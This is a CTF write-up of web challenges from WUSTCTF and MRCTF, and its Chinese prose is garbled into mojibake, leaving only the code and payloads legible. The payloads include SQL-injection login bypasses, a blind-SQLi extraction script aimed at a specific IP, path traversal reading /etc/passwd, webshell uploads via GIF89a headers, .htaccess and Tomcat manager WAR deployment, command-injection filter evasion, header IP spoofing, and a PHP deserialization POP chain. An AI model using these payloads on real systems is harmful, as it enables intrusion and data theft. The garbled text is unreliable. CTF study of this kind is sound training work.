ä¸ºå¯¹æ¯”èµ›é¢˜ç›®å¿ƒé‡Œæœ‰æ„è§ï¼Œè¯´æ˜¯æ–°ç”Ÿèµ›ï¼Œè„‘æ´è·Ÿå¥—å¨ƒé¢˜æŠŠä¸€å †è€æ‰‹éƒ½æ•´å¾—ä¸èˆ’æœã€‚å½“æ—¶å·®ä¸€é“ASP.NET,å› ä¸ºysoserialçš„gadgetç”¨çš„ä¸å¯¹å°±ä¸€ç›´å‡ºä¸äº†ç»“æœï¼Œç›´æ¥å¿ƒæ€æå´©ï¼‰æ‰€ä»¥è¿™æ¬¡æŠŠè¿™ä¸¤ä¸ªæ–°ç”Ÿèµ›é¢˜ç›®å†™å†™ã€‚å…·ä½“åªå¤§è‡´è®²ä¸‹æ€è·¯å§ WUSTCTFå¾ˆæœ‰æ„æ€ï¼Œé¢˜ç›®é‡Œphpéš¾åº¦éƒ½æ¯”è¾ƒåŸºç¡€ã€‚javaéš¾åº¦å°±ä¸ä¸€æ ·äº†ï¼Œä¼°è®¡æ˜¯javaæ¥è§¦çš„å°‘çš„åŸå› å§ã€‚ checkinè¿›å»ä¸€ä¸ªå‰ç«¯éªŒè¯ã€‚é™åˆ¶æŒ‰é’®è·Ÿé•¿åº¦ã€‚å‰ç«¯æŠŠæŒ‰é’®è§£å†³åæŠ“ä¸ªåŒ…ä¼ å‡ºé¢˜äººåå­—å°±å¥½ï¼Œå¾—åˆ°å‡ºé¢˜äººblog(è€å®è¯´æ¶æ„å¼•æµä¸å¥½å§â€¦â€¦)å¯ä»¥åœ¨åšå®¢å‰ç«¯çœ‹åˆ°éƒ¨åˆ†flagï¼Œä½†æ˜¯åªæœ‰ä¸€åŠï¼Œåä¸€åŠé€šè¿‡åšå®¢é“¾æ¥åˆ°githubå»,å¯ä»¥æ‰¾åˆ°ååŠéƒ¨åˆ† adminå¼€å§‹éšæ‰‹ä¸€ä¸ªä¸‡èƒ½å¯†ç admin&#39; or 1=1#å°±è¿›å»äº†ã€‚/adddddddddddddddddddddddminnnnnnnnnnnnnnnnnnnnnn.phpç„¶åå°±æ˜¯æ”¹headerä»¥åŠgetï¼Œpostå€¼å³å¯å¾—åˆ°paste.ubuntuåˆ†æ®µç»™å‡ºçš„ç½‘é¡µé“¾æ¥ï¼Œæ‰¾åˆ°æ­£ç¡®çš„å³å¯å¾—åˆ°ç¼–ç åçš„flagã€‚è§£ç å³å¯ CV MakeråŸºç¡€ä¸Šä¼ ,ç™»å½•æ³¨å†Œåå…ˆä¸Šä¼ ä¸€ä¸ªphp,æŠ¥çš„æ˜¯exif_imagetype()æ£€æŸ¥ã€‚é‚£å°±åªè¦æ–‡ä»¶å¤´è§£å†³å°±å¥½äº†ï¼Œä¼ ä¸€ä¸ªé©¬,å‰é¢åŠ ä¸ŠGIF89Aå³å¯ã€‚(è¿™é‡Œè¿˜æœ‰uploadsçš„ç›®å½•éå†,éšä¾¿ä¸€ä¸ªéƒ½æ˜¯ç°æˆçš„å‚è€ƒæ¡ˆä¾‹)èšå‰‘è¿æ¥åæ ¹ç›®å½•/readflagå³å¯ã€‚ easywebè¿™é¢˜æ˜¯é“javaé¢˜ã€‚æˆ‘ç”¨éé¢„æœŸåšå‡ºæ¥çš„ã€‚æ¯•ç«Ÿè‡ªå·±javaçŸ¥è¯†æœ‰é™â€¦â€¦ é¦–å…ˆè¿›å»åˆæ˜¯ä¸ªä¸Šä¼ ï¼Œä¼ ä¸€ä¸ªæ–‡ä»¶ä¸Šå»çœ‹åˆ°çˆ†å‡ºä¸€ä¸ªdownloadè·¯ç”±ä¸fileå‚æ•°é‚£å°±æœ‰ä»»æ„æ–‡ä»¶ä¸‹è½½javaé¢˜å¿…è¯»çš„å‡ ä¸ªé…ç½®æ–‡ä»¶,é¦–å…ˆå°±æ˜¯WEB-INFä¸‹çš„web.xml 123456789101112131415161718192021 &lt;context-param&gt; &lt;param-name&gt;webAppRootKey&lt;/param-name&gt; &lt;param-value&gt;tomcat.ajp&lt;/param-value&gt; &lt;/context-param&gt; &lt;listener&gt; &lt;listener-class&gt; org.springframework.web.util.WebAppRootListener &lt;/listener-class&gt; &lt;/listener&gt; &lt;welcome-file-list&gt; &lt;welcome-file&gt;/WEB-INF/views/index.jsp&lt;/welcome-file&gt; &lt;/welcome-file-list&gt; &lt;error-page&gt; &lt;exception-type&gt;java.lang.Throwable&lt;/exception-type&gt; &lt;location&gt;/error&lt;/location&gt; &lt;/error-page&gt;&lt;/web-app&gt; åªæœ‰ä¸€ä¸ªindex.jsp,åŒæ ·ä¸‹è½½åå‘ç°æ²¡ä»€ä¹ˆå†…å®¹ã€‚è¿™æ—¶å¼€å§‹å°è¯•è¯»å–å…¶ä»–æ–‡ä»¶ï¼Œæ„é€ åå‘ç°å¯ä»¥è¯»å–åˆ°/etc/passwd 1234567891011121314151617181920212223242526root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/bin/falsemessagebus:x:101:102::/var/run/dbus:/bin/falsesshd:x:102:65534::/run/sshd:/usr/sbin/nologinsystemd-timesync:x:103:104:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:x:104:105:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:x:105:106:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:x:106:107:systemd Bus Proxy,,,:/run/systemd:/bin/falsetomajp:x:1000:1000::/home/tomajp:/bin/bash æœ‰æ„æ€çš„æ˜¯,æˆ‘ä»¬é¢˜ç›®èµ·çš„tomajpç”¨æˆ·çš„å®¶ç›®å½•æ˜¯ bin/bash.è¿™ç‚¹è®©æˆ‘æƒ³èµ·äº†ä¹‹å‰åšç½‘é¼æ¯Commentè¿™é“é¢˜çš„ä¸€ä¸ªæ”¶è·ï¼šäºŒæ¬¡æ³¨å…¥,æ•°æ®åº“å´æ²¡æœ‰flag,é€šè¿‡è¯»å–.bash_historyå‘ç°äº†å…¶ä»–æ–‡ä»¶å¤¹ä¸­æœªåˆ é™¤çš„flagä»è€Œè¯»å–ã€‚é‚£ä¹ˆæœ¬é¢˜å°è¯•è¯»å–/home/tomajp/.bash_historyå‘ç°æœ‰è¹Šè··ï¼Œæ‹–åˆ°ä¸‹é¢æœ‰å‘ç°æ ¹æ®è¿™é‡Œè®°å½•çš„æ“ä½œå¯ä»¥çœ‹åˆ°ï¼Œflagåº”è¯¥æ˜¯åœ¨æ ¹ç›®å½•çš„flaaaagæ–‡ä»¶å¤¹ä¸‹çš„what_you_wantç›´æ¥è¯»å–å³å¯/download?file=../../../../../../../../../flaaaag/what_you_want é—®äº†ä¸‹å®˜æ–¹,çš„ç¡®æ˜¯ä¸ªæ¯”è¾ƒç®€å•çš„éé¢„æœŸ,é¢„æœŸè§£æ˜¯ä¸Šä¼ jspè¿›è¡ŒRCE.ä½†æ˜¯æˆ‘ä¸€ç›´æ²¡å¼„æ˜ç™½tomcaté‡Œä¸Šä¼ ç›®å½•è¦æ€ä¹ˆè®¿é—®ï¼Œè¿™ä¸ªå¯èƒ½æ˜¯åƒäº†ä¸ç†Ÿæ‚‰javawebçš„é”…ã€‚ä¸è¯´äº†ï¼Œä¹‹å‰è¯´å¥½è¦å­¦javawebä¹Ÿå¾—æä¸Šæ—¥ç¨‹äº†ã€‚ps:èµ›åäº†è§£åˆ°æ˜¯ghostcatæ‰“ã€‚è¿™ä¸ªå°±å¾ˆæœ‰è¶£äº†ï¼Œå› ä¸ºåŒæœŸçš„å¦ä¸€ä¸ªå›½é™…èµ›æœ‰é¢˜ä¹Ÿæ˜¯è¿™ä¸ªå¹½çµçŒ«ã€‚æ‰¾æ—¶é—´ç­‰buuä¸Šé¶æœºäº†å¤ç°ä¸‹è¿™ä¸ªæ´ã€‚ä¸ç”¨ç­‰äº†ï¼Œç›´æ¥çœ‹æˆ‘ä¸‹ä¸€ç¯‡æ–‡ç« å³å¯ã€‚åšä¸€ä¸ªè„šæœ¬å°å­ï¼Œghostcatåˆ©ç”¨è¿˜æ˜¯ä¸éš¾çš„ã€‚ æœ´å®æ— åå…ˆæ”¾ä¸€ä¸ªæ²¡æ‹¿åˆ°ä¸€è¡€çš„åŸå› æ‰‹æ…¢ä¸€æ­¥åŠ ä¸Šå‡ºé¢˜äººæƒé™æ²¡æ§å¥½,ç›´æ¥flagè¢«åˆ äº†ã€‚å¯¼è‡´æˆ‘å¤šèŠ±äº†åŠä¸ªå°æ—¶,æ‰¾å‡ºé¢˜äººæ²Ÿé€šåå¥½äº†ã€‚ä¸è¿‡è¯´åˆ°åº•æ…¢ä¸€æ­¥flagè¢«åˆ è¿˜æ˜¯å› ä¸ºåªæœ‰äºŒè¡€çš„æ‰‹é€Ÿâ€¦â€¦ é¦–å…ˆæ˜¯ä¿¡æ¯æ”¶é›†ï¼Œè¿™é‡Œå¥‡æ€ªçš„ä¸€ç‚¹æ˜¯/.git/ç›®å½•ç›´æ¥æš´éœ²åœ¨å¤–äº†,ä½†æ˜¯ä»”ç»†è§‚å¯Ÿä¸‹å‘ç°åªæ˜¯ä¸ªlampçš„git.ä¸çŸ¥é“æ˜¯ä¸æ˜¯ä¸ºäº†æ··æ·†è§†å¬æ•…æ„æ”¾çš„ã€‚åæ­£æˆ‘æ˜¯githackç”¨äº†å‡ æ¬¡æ‰å¯Ÿè§‰ä¸å¯¹åŠ²çš„ã€‚ ä¸ªäººä¿¡æ¯æ”¶é›†ä¸€ç›´æ˜¯æ‰‹æµ‹,æµ‹äº†å¥½å¤šæºç æ³„éœ²æ²¡ååº”åæ³¨æ„åˆ°index.phpç½‘é¡µçš„æ ‡é¢˜ä¸ºbotã€‚äºæ˜¯è€ƒè™‘robots.txtï¼Œå‘ç°äº†fAke_f1agggg.phpè®¿é—®åå½“ç„¶æ²¡æœ‰çœŸflagï¼Œä½†æ˜¯headeré‡Œæœ‰fl4g.phpï¼Œå¾—åˆ°é¢˜ç›®æºç  123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpheader('Content-type:text/html;charset=utf-8');error_reporting(0);highlight_file(__file__);//level 1if (isset($_GET['num']))&#123; $num = $_GET['num']; if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021)&#123; echo \"æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;\"; &#125;else&#123; die(\"é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜\"); &#125;&#125;else&#123; die(\"å»éæ´²å§\");&#125;//level 2if (isset($_GET['md5']))&#123; $md5=$_GET['md5']; if ($md5==md5($md5)) echo \"æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;\"; else die(\"æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²\");&#125;else&#123; die(\"å»éæ´²å§\");&#125;//get flagif (isset($_GET['get_flag']))&#123; $get_flag = $_GET['get_flag']; if(!strstr($get_flag,\" \"))&#123; $get_flag = str_ireplace(\"cat\", \"wctf2020\", $get_flag); echo \"æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;\"; system($get_flag); &#125;else&#123; die(\"å¿«åˆ°éæ´²äº†\"); &#125;&#125;else&#123; die(\"å»éæ´²å§\");&#125;?&gt; è€å¥—å¨ƒäº†ã€‚ç¬¬ä¸€å±‚ä¸€ä¸ªintvalçš„é—®é¢˜ã€‚è¿™é‡Œä½¿ç”¨çš„æ˜¯ä¸€ä¸ªè¿›åˆ¶çš„æŠ€å·§ï¼Œæ¯”å¦‚2020çš„16è¿›åˆ¶7e4intvalä¼šå°†å­—ç¬¦ä¸²7e4è®¤ä½œ7,è€Œintval(â€œ7e4â€+1)åˆ™è¢«ç±»å‹è½¬æ¢ï¼Œå˜ä¸º70001 ç¬¬äºŒå±‚å¼±ç±»å‹æ¯”è¾ƒçš„é—®é¢˜$md5==md5($md5)ä½†æ˜¯åŸæ¥æ ¡èµ›æ€»ç»“æ—¶å°±å¼ºè°ƒè¿‡ï¼Œç½‘ä¸Šä¸€ç›´ä»¥æ¥çš„è¯´æ³•å¾ˆä¸å‡†ç¡®ã€‚å¹¶éæ˜¯0eå¼€å¤´æ‰ä¼šè¢«åˆ¤ä½œ0.è€Œæ˜¯å› ä¸º0eå¼€å¤´ä¸”çº¯æ•°å­—ç„¶åæ‰èƒ½è¢«è½¬ä¸º0https://www.jianshu.com/p/52f04f85824eæ•…æˆ‘ä»¬éœ€è¦0eå¼€å¤´çº¯æ•°å­—çš„æ•°ï¼Œä½¿å¾—å…¶MD5å€¼0eå¼€å¤´ä¸”çº¯æ•°å­—ã€‚å› æ­¤è¿™ä¸ªä¸€å®šæ˜¯è¦è„šæœ¬è·‘çš„ï¼Œæ‰€ä»¥æˆ‘é€‰æ‹©æ”¾å¼ƒhhhã€‚æ‰¾é˜Ÿå‹è¦äº†ä»¥å‰è®²è¿‡è¿™ä¸ªtrickçš„æ–‡ç« ï¼Œå¾—åˆ°äº†è¿™ä¸ªç¥å¥‡æ•°å­—0e215962017 ç¬¬ä¸‰å±‚åŸºç¡€è‡³æã€‚ca\\tå¯ä»¥ç»•è¿‡å…³é”®å­—ï¼Œ${IFS}æ›¿ä»£ç©ºæ ¼ï¼Œè¯»flagå¯ä»¥ç›´æ¥ç”¨fll*ï¼Œæˆ–è€…ç›´æ¥cat cat `ls` å³å¯ã€‚ä¸»è¦è¿˜æ˜¯è¢«äººæ…å±å¯¼è‡´å¤šè¯•äº†å¥½ä¹…,è¿˜é¡ºä¾¿æ‰“ç®—å¼¹shellã€‚ç»“æœè¯•äº†5ç§æ–¹æ³•éƒ½æ²¡æˆ,çœŸçš„æ°”äººpayload 1?num&#x3D;7e4&amp;md5&#x3D;0e215962017&amp;get_flag&#x3D;ca\\t$&#123;IFS&#125;&#96;ls&#96; é¢œå€¼æˆç»©æŸ¥è¯¢è£¸çš„æ•°å€¼å¸ƒå°”ç›²æ³¨ï¼Œç›´æ¥ä¸Šifåˆ†æµå°±å®Œäº‹ã€‚å¥½åƒè¿‡æ»¤äº†ç©ºæ ¼ï¼Œé‚£å°±æ‹¬å·å¤šå¥—ä¸€ä¸‹ã€‚å› ä¸ºæ‰“é”™äº†å‚æ•°stunumï¼Œå¯¼è‡´åªæ‹¿åˆ°ä¸‰è¡€ã€‚æ°”æ­»äº†â€¦ä»¥åä¸€å®šç›´æ¥å¤åˆ¶ç²˜è´´urlã€‚åƒå¤§äºã€‚ 123456789101112131415import requestsimport urllib.parseurl='http://101.200.53.102:10114/index.php?stunum='flag=''for i in range(1,50): print(i) for str1 in \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&amp;*``.&#123;&#125;-\": payload = \"if(ascii(substr((select(group_concat(value))from(flag)),\"+str(i)+\",1))=\" + str(ord(str1)) + \",1,2)\" payload = urllib.parse.quote(payload) r = requests.get(url + payload) if 'admin' in r.text: flag+=str1 print(flag) break æœ‰é“1è§£é¢˜è²Œä¼¼å¾ˆé¡¶å°±æ²¡æœ‰çœ‹ã€‚ Train Yourself To Be Godlyåˆ°buuä¸Šå¤ç°äº†ã€‚ä»”ç»†åšä¼šå‘ç°è¿˜æ˜¯ç»†èŠ‚ä¸Šé—®é¢˜æ¯”è¾ƒå¤šã€‚é¦–å…ˆæ˜¯åˆ†æã€‚å› ä¸ºé¢˜ç›®æ˜¾ç¤ºçš„é¡µé¢æ˜¯tomcaté»˜è®¤çš„/examplesè·¯ç”±ã€‚é‚£ä¹ˆè¯´æ˜æ˜¯ç”¨examplesåšçš„æ ¹ç›®å½•https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdfç„¶åæ˜¯è¿™ä¸ªæ–‡æ¡£ã€‚å¯ä»¥æ„é€ è·¯å¾„ç©¿è¶Šï¼Œæ¥åˆ°å…¶ä»–è·¯å¾„ä¸‹ã€‚æ¯”å¦‚æ­¤å¤„ä¸ºäº†getshell,è¿›å…¥/manageræ„é€ /..;/managerä¹‹åä¸€ä¸ªtomcat:tomcatçš„å¼±å£ä»¤ã€‚å…·ä½“getshellæµç¨‹å¯ä»¥å‚è€ƒvulhubä¸Štomcat/tomcat8çš„æ¼æ´Tomcat7+ å¼±å£ä»¤ &amp;&amp; åå°getshellæ¼æ´ã€‚[https://github.com/vulhub/vulhub/blob/master/tomcat/tomcat8](https://github.com/vulhub/vulhub/blob/master/tomcat/tomcat8)æˆ‘ä¹Ÿç®€å•å¤ç°äº†ä¸‹ï¼Œå¯ä»¥å»æˆ‘çš„vulhubå¤ç°æ–‡ç« é‚£çœ‹ã€‚å…ˆç»™å‡ºwebshell.jspä¸webshell.warçš„ç”Ÿæˆæ–¹æ³• 123&lt;% %&gt; å¸¦å›æ˜¾ä¸å¯†ç çš„jspï¼Œæ¯”è¾ƒå¥½ç”¨ã€‚ç„¶åå‘½ä»¤è¡Œå¯ä»¥ç”Ÿæˆwarjar cvf webshell.war webshell.jspè²Œä¼¼ç›´æ¥å‹ç¼©jspæˆzipç„¶åæ”¹åç¼€ä¸ºwarä¹Ÿå¯ä»¥ã€‚è¿›å…¥åè‡ªç„¶æ˜¯ä¸Šä¼ waråŒ…äº†ã€‚ä½†æ˜¯å¾ˆå¿«å‘ç°ç‚¹å‡»ä¸Šä¼ åè¿”å›404ã€‚è€Œå®ƒçš„è·¯å¾„ç»™çš„æ˜¯ 1&#x2F;examples&#x2F;..;&#x2F;manager&#x2F;html&#x2F;upload?org.apache.catalina.filters.CSRF_NONCE&#x3D;A226F07F06C2C983EE2911A5963BFA84 çœ‹æ¥æ˜¯åˆä»æ ¹ç›®å½•å¼€å§‹åŠ è½½è·¯å¾„äº†ï¼Œè¿™ä¸ªç”¨åŒæ ·çš„æ–¹æ³•ï¼Œå°†è·¯å¾„æ”¹æˆ/..;/manager/html/upload......å³å¯ä¸è¿‡å¾ˆå¿«ä¼šå‘ç°401ã€‚æœªæˆæƒè®¿é—®ã€‚å¦‚æœç†Ÿæ‚‰tomcatçš„å¾ˆå¿«èƒ½ååº”è¿‡æ¥æ˜¯å°‘äº†headeré‡Œçš„è®¤è¯ï¼Œå½“ç„¶åœ¨æˆåŠŸè®¿é—®åå°æ—¶æŠ“åŒ…ä¹Ÿèƒ½çœ‹åˆ°è‡ªå·±çš„headerä¸­æœ‰è®¤è¯å¤´ã€‚Authorization: Basic dG9tY2F0OnRvbWNhdA==åé¢å°±æ˜¯tomcat:tomcatçš„base64ç¼–ç ã€‚è¿™é‡Œæ˜¾ç„¶å› ä¸ºæˆ‘ä»¬æ˜¯é€šè¿‡æ„é€ è·¯å¾„ç©¿è¶Šçš„é—®é¢˜ï¼Œæ²¡æœ‰åœ¨uploadæ—¶è‡ªåŠ¨å¸¦ä¸Šã€‚é‚£ä¹ˆç»§ç»­ä¸Šä¼ ï¼Œå‘ç°403.åªèƒ½æ˜¯cookieçš„é—®é¢˜äº†ã€‚å›å¤´å»çœ‹è®¿é—®/..;/manager/htmlæ—¶å°±å­˜åœ¨set-cookieçš„è¿”å›ã€‚é‚£ä¹ˆåªèƒ½æ˜¯ç¼ºcookieäº†ã€‚å…·ä½“åšæ³•ï¼šé‡æ–°è®¿é—®ä¸€é/..;/manager/htmlä»è¿”å›å¤´å–ä¸€ä¸ªcookie.ç„¶åä¸Šä¼ æ—¶æŠ“åŒ…æ‹¦æˆªï¼ŒæŠŠè®¤è¯è·Ÿcookieä»¥åŠè®¿é—®åœ°å€å…¨éƒ¨æ”¹å¥½ï¼Œç›´åˆ°200ä¸ºæ­¢ã€‚ç„¶åå°±å¯ä»¥è®¿é—®webshellè¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†ã€‚è¿™é‡Œflagæ¯”èµ›æ˜¯åœ¨æ ¹ç›®å½•çš„æ–‡ç« ä¸­ï¼Œbuuæ˜¯åœ¨æ ¹ç›®å½•./..;/webshell/exp.jsp?pwd=023&amp;i=cat%20/flagggg MRCTFå¤©ç’‡çš„æ¯”èµ›ç›¸å¯¹WUSTå°±éš¾ä¸€ç‚¹ï¼Œç„¶è€Œè¿˜æ˜¯ä¸€å †å¥—å¨ƒã€‚å¿ƒé‡Œè‹¦ã€‚å¥—å¨ƒé¢˜å¤šçœŸçš„æ˜¯CTFæ¯”èµ›æ€ªç°çŠ¶äº†,è„±ç¦»äº†CTFçš„æœ¬è´¨â€¦ ezbypassè€å¥—å¨ƒäº†ã€‚æ–¹æ³•éƒ½è€å¥—äº†ã€‚ç¬¬ä¸€æ­¥ä¸€ä¸ªMD5ç¢°æ’ï¼Œç½‘ä¸Šä¸€å †ç°æˆçš„ã€‚ç¬¬äºŒæ­¥ä¸€ä¸ªisnumeric()ï¼Œåªéœ€è¦åœ¨æ•°å­—åéšä¾¿åŠ ä¸ªç¬¦å·å°±å¯ä»¥ç»•è¿‡ ä½ ä¼ ä½ ğŸå‘¢æ–‡ä»¶ä¸Šä¼ åŸºæœ¬å¥—è·¯ï¼Œè¯•äº†ä¸‹å‘ç°phpå¯è§£æçš„å‡ ä¸ªåç¼€éƒ½æ²¡äº†ã€‚é‚£è¯•è¯•.htaccesså‘ç°å¯ä»¥ã€‚é‚£å°±æ²¡äº‹äº†ï¼Œç»•æ–‡ä»¶æ£€æŸ¥ä¸Šä¼ jpgå›¾ç‰‡é©¬ 1addtype application&#x2F;x-httpd-php .jpg PYwebsiteæˆ‘æ‰¿è®¤è¿™é¢˜æ˜¯æˆ‘è‡ªå·±èœäº†ã€‚å¼€å§‹å‰ç«¯ä¸€ä¸ªéªŒè¯MD5ï¼Œä½†æ˜¯æ˜¯ä¸ªjsã€‚æˆ‘è¿˜è·‘å»æœjsçš„MD5å¼±ç±»å‹ï¼Œå‘ç°å¥½åƒå°±æ²¡æœ‰è¿™ä¸ªtrickå•Šâ€¦ åæ¥æ‰æ³¨æ„flag.phpè¯´ä»–è®°å½•äº†æ‰€æœ‰è´­ä¹°è€…ipæ‰€ä»¥X-Forwarded-For:127.0.0.1è®¿é—®å³å¯ å¥—å¨ƒå…ˆæ˜¯è¦ç»•ç¬¬ä¸€å±‚ï¼Œä½†æ˜¯æ€ä¹ˆçœ‹ç€å°±åƒæˆ‘ä»¬nctfçš„é¢˜å‘¢ï¼Ÿ 12345678&lt;?php$query = $_SERVER['QUERY_STRING']; if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 )&#123; die('Y0u are So cutE!');&#125; if($_GET['b_u_p_t'] !== '23333' &amp;&amp; preg_match('/^23333$/', $_GET['b_u_p_t']))&#123; echo ä½¿ç”¨b.u.p.tæ›¿ä»£ï¼Œä»¥åŠåœ¨23333ååŠ ä¸Š%0aç»•è¿‡preg_match() ç¬¬äºŒå±‚é¦–å…ˆä¸€å †jsfuckï¼Œæ‰”Chromeæ§åˆ¶å°å¾—åˆ°ä¸€ä¸ªæç¤ºpost Merak,ä¼ ä¸ªå€¼å¾—åˆ°æºç  12345678910111213141516171819202122232425262728&lt;?php error_reporting(0); include 'takeip.php';ini_set('open_basedir','.'); include 'flag.php';if(isset($_POST['Merak']))&#123; highlight_file(__FILE__); die(); &#125; function change($v)&#123; $v = base64_decode($v); $re = ''; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) + $i*2 ); &#125; return $re; &#125;echo 'Local access only!'.\"&lt;br/&gt;\";$ip = getIp();if($ip!='127.0.0.1')echo \"Sorry,you don't have permission! Your ip is :\".$ip;if($ip === '127.0.0.1' &amp;&amp; file_get_contents($_GET['2333']) === 'todat is a happy day' )&#123;echo \"Your REQUEST is:\".change($_GET['file']);echo file_get_contents(change($_GET['file'])); &#125;?&gt; æ¥ç€è€å¥—å¨ƒäº†ã€‚é¦–å…ˆæ˜¯getIp()å‡½æ•°ï¼Œå»å®˜ç½‘æŸ¥äº†ä¸‹ï¼Œæ˜¯headerå¯æ§ã€‚é‚£å°±headerè®¾ç½®ä¸ºClient-IP:127.0.0.1ç„¶åä¸ºäº†file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39;è¿™æ­¥è€æ–¹æ³•ä½¿ç”¨dataåè®®data://text/plain,todat is a happy dayæœ€åä¸€ä¸ªfileå…ˆç”¨ä¸Šé¢ç»™çš„å‡½æ•°æ”¹æ”¹ç¼–ç ä¸‹å³å¯ã€‚ Ezpoppopé“¾æ„é€ ,å®è¯è¯´ä¸‰ä¸ªç±»çš„popå¾ˆåŸºç¡€ï¼Œä¸è¿‡æˆ‘å¼€å§‹è§‰å¾—è¿™ä¸ªèµ·ç‚¹è´¼è¯¡å¼‚ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123; protected $var; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file='index.php')&#123; $this-&gt;source = $file; echo 'Welcome to '.$this-&gt;source.\"&lt;br&gt;\"; &#125; public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this-&gt;source)) &#123; echo \"hacker\"; $this-&gt;source = \"index.php\"; &#125; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = array(); &#125; public function __get($key)&#123; $function = $this-&gt;p; return $function(); &#125;&#125;if(isset($_GET['pop']))&#123; @unserialize($_GET['pop']);&#125;else&#123; $a=new Show; highlight_file(__FILE__);&#125; ç›®æ ‡è‡ªç„¶æ˜¯include flag.phpäº†ã€‚ä¸è¿‡æœ€å¥½ç›´æ¥ä¼ªåè®®è¯»ã€‚ é¦–å…ˆè¦è§¦å‘__toStringé‚£å°±å…ˆæ¥ä¸ªechoã€‚ä¹Ÿå°±æ˜¯è¯´è¿˜å¾—å†æ¥ä¸ªShowç±»å¯¹è±¡ç½®ä¸ºå®ƒçš„sourceå±æ€§,echoæ—¶è§¦å‘.Showç±»å¸¦Showç±»,è®²ç©¶ã€‚ ä¹‹å$this-&gt;str-&gt;sourceæ˜æ˜¾å¯ä»¥è§¦å‘Testçš„__get()ï¼Œç„¶åè¿”å›å€¼æ˜¯å‡½æ•°ï¼Œé‚£å°±å¯ä»¥è§¦å‘Modiferçš„__invoke()äº†ã€‚ å¾ˆç®€å•çš„é“¾å­ï¼Œå°±æ˜¯ç¬¬ä¸€æ­¥è‡ªå·±å¼€å§‹çŠ¯å‚»ä»¥ä¸º__toString()è§¦å‘æ˜¯echoæ—¶è‡ªåŠ¨å°±æœ‰çš„ï¼Œæƒ³äº†åŠå¤©ç¡®è®¤åº”è¯¥è¿˜æ˜¯å¾—å¯¹è±¡echoæ‰ä¼šè§¦å‘ã€‚è¿™ç‚¹ä¸èƒ½æ··æ·†ã€‚poc: 12345678910111213141516171819202122&lt;?phpclass Modifier &#123; protected $var=\"php://filter/read=convert.base64-encode/resource=flag.php\";&#125;class Show&#123; public $source; public $str;&#125;class Test&#123; public $p;&#125;$a=new Show();$b=new Show();$a-&gt;source=$b;$b-&gt;str=new Test();$b-&gt;str-&gt;p=new Modifier();echo(urlencode(serialize($a))); Ezauditæç¤ºaudité‚£å°±çœ‹çœ‹æºç æ³„éœ²ã€‚å‘ç°www.zipï¼Œç»“æœä¸Šæ¥å°±åªæœ‰ä¸€ä¸ªindex.php,è¿˜ä»¥ä¸ºæœ‰å¾ˆå¤šæºç  